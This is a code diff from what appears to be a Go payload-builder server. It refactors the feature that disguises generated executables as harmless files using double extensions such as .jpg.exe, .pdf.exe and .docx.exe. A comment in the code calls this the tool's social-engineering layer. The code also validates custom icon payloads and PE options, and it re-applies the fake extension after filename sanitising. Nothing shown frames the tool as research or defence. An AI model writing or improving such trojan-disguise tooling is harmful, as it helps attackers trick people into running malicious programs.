@@ -161,36 +161,9 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 		}
 	}
 
-	// Handle JPG disguise: if disguise_as=jpg, ensure filename looks like a JPG
-	// (e.g. photo.jpg.exe). This is the user-visible social-engineering layer;
-	// Filename disguise - support jpg/pdf/doc/xls/zip
-	disguiseLower := strings.ToLower(form.DisguiseAs)
-	disguiseExt := ""
-	switch disguiseLower {
-	case "jpg", "jpeg":
-		disguiseExt = ".jpg"
-	case "pdf":
-		disguiseExt = ".pdf"
-	case "doc", "word", "docx":
-		disguiseExt = ".docx"
-	case "xls", "xlsx":
-		disguiseExt = ".xlsx"
-	case "zip":
-		disguiseExt = ".zip"
-	}
-	if disguiseExt != "" && form.Filename != "" {
-		lower := strings.ToLower(form.Filename)
-		if !strings.Contains(lower, disguiseExt) {
-			base := strings.TrimSuffix(form.Filename, ".exe")
-			base = strings.TrimSuffix(base, ".EXE")
-			for _, ext := range []string{".jpg", ".jpeg", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".zip"} {
-				if strings.HasSuffix(strings.ToLower(base), ext) {
-					base = base[:len(base)-len(ext)]
-					break
-				}
-			}
-			form.Filename = base + disguiseExt + ".exe"
-		}
+	// Disguise filename via shared payload helper (single source of truth).
+	if form.Filename != "" {
+		form.Filename = payload.ApplyDisguiseFilename(form.Filename, form.DisguiseAs)
 	}
 	// Validate icon payload (≤350KB base64 ≈ 256KB raw)
 	if form.IconB64 != "" {
@@ -203,24 +176,12 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 			return nil, false
 		}
 	}
-	// Restrict disguise_as to known values (jpg/pdf/doc/xls/zip/folder/chrome/word)
-	allowedDisguise := map[string]bool{"jpg": true, "jpeg": true, "pdf": true, "doc": true, "docx": true, "word": true, "xls": true, "xlsx": true, "zip": true, "folder": true, "chrome": true}
-	if form.DisguiseAs != "" && !allowedDisguise[strings.ToLower(form.DisguiseAs)] {
-		form.DisguiseAs = ""
-	} else {
-		form.DisguiseAs = strings.ToLower(form.DisguiseAs)
-		// normalize aliases
-		if form.DisguiseAs == "jpeg" {
-			form.DisguiseAs = "jpg"
-		}
-		if form.DisguiseAs == "docx" {
-			form.DisguiseAs = "doc"
-		}
-		if form.DisguiseAs == "xlsx" {
-			form.DisguiseAs = "xls"
-		}
-		if form.DisguiseAs == "word" {
-			form.DisguiseAs = "doc"
+	// Restrict disguise_as via shared payload helper (canonical keys + aliases).
+	if form.DisguiseAs != "" {
+		if !payload.AllowedDisguise(form.DisguiseAs) {
+			form.DisguiseAs = ""
+		} else {
+			form.DisguiseAs = payload.NormalizeDisguise(form.DisguiseAs)
 		}
 	}
 	// Normalize PE options
@@ -245,14 +206,13 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 	// Sanitize first to block path traversal and header-injection characters.
 	if form.Filename != "" {
 		// Preserve double extension for disguise (e.g. .jpg.exe) — sanitize each part
-		origDisguise := form.DisguiseAs == "jpg" && strings.Contains(strings.ToLower(form.Filename), ".jpg.exe")
+		disguiseExtWant := payload.DisguiseExtFor(form.DisguiseAs)
+		origDisguise := disguiseExtWant != "" && strings.Contains(strings.ToLower(form.Filename), disguiseExtWant+".exe")
 		form.Filename = sanitizeFilename(form.Filename)
 		// sanitizeFilename replaces '.'-prefixed leading dots and may mangle double ext;
 		// re-apply disguise suffix if it was stripped
-		if origDisguise && !strings.Contains(strings.ToLower(form.Filename), ".jpg") {
-			base := strings.TrimSuffix(form.Filename, ".exe")
-			base = strings.TrimSuffix(base, ".EXE")
-			form.Filename = base + ".jpg.exe"
+		if origDisguise && !strings.Contains(strings.ToLower(form.Filename), disguiseExtWant) {
+			form.Filename = payload.ApplyDisguiseFilename(form.Filename, form.DisguiseAs)
 		}
 		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
 		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
